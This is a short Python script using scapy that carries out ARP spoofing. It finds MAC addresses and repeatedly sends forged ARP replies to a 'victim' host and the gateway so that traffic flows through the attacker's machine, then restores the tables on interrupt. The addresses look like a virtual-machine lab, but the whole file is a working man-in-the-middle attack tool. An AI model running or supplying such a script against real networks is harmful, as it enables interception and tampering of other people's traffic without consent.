import scapy.all as scapy
import time

def get_mac(ip):
    arp_request = scapy.ARP(pdst=ip)
    broadcast = scapy.Ether(dst="ff:ff:ff:ff:ff:ff")
    request_broadcast = broadcast / arp_request

    answered_list = scapy.srp(request_broadcast, timeout=2, verbose=False)[0]

    if answered_list:
        return answered_list[0][1].hwsrc
    return None

def spoof(target_ip, spoof_ip):
    target_mac = get_mac(target_ip)
    if not target_mac:
        return

    packet = scapy.ARP(
        op=2,
        pdst=target_ip,
        hwdst=target_mac,
        psrc=spoof_ip
    )
    scapy.send(packet, verbose=False)

def restore(target_ip, source_ip):
    target_mac = get_mac(target_ip)
    source_mac = get_mac(source_ip)

    packet = scapy.ARP(
        op=2,
        pdst=target_ip,
        hwdst=target_mac,
        psrc=source_ip,
        hwsrc=source_mac
    )
    scapy.send(packet, count=4, verbose=False)

target_ip = "10.0.2.3"   # victim (you can change later)
gateway_ip = "10.0.2.2"  # router

try:
    while True:
        spoof(target_ip, gateway_ip)
        spoof(gateway_ip, target_ip)
        print("Packets sent...")
        time.sleep(2)

except KeyboardInterrupt:
    print("Restoring network...")
    restore(target_ip, gateway_ip)
    restore(gateway_ip, target_ip)